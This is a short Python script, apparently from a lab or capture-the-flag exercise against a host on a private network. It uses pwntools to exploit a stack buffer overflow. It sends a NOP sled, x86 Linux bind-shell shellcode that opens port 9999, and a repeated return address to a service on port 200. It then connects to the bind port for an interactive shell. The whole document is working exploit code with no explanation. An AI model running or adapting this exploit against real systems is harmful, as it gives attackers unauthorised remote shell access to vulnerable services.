from pwn import *

target = '192.168.56.102'
listeningPort = 200
bindPort = 9999
repeatAddr = p32(0xffffbd88)
repeat_num_times = 50

shellcode = (
    "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
    "\x43\x52\x66\x68\x27\x0f\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
    "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
    "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
    "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    "\x89\xe1\xcd\x80"
).encode('latin-1')

NOPSled = b"\x90"*(536-84-200)
print(f"The sled length is {len(NOPSled)}")
eol = b'\r\n'
returnAddr = repeatAddr*repeat_num_times

exploit_code = NOPSled + shellcode  + returnAddr + eol
print(f"The payload length is {len(exploit_code)}")
io = connect(target, listeningPort)
io.send(exploit_code)


io = connect(target, bindPort)
io.interactive()

